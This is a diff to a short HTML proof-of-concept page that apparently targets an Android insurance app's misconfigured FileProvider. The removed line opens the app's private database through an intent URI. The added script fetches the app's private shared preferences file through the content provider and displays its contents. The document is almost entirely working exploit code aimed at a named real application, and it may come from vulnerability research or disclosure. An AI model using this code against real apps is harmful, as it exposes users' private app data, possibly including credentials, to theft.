@@ -1,7 +1,13 @@
 <html>
 <body>
+<pre id="out">Loading...</pre>
 <script>
-location.href = "intent:#Intent;action=android.intent.action.VIEW;data=content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/databases/alfa_db;type=application/octet-stream;launchFlags=0x1;end";
+fetch('content://ru.alfastrah.app.easyphotopicker.fileprovider/root/data/data/ru.alfastrah.app/shared_prefs/preferences.xml')
+.then(r => r.text())
+.then(t => {
+  document.getElementById('out').innerText = 'SUCCESS:\n' + t;
+})
+.catch(e => document.getElementById('out').innerText = 'BLOCKED: ' + e);
 </script>
 </body>
 </html>
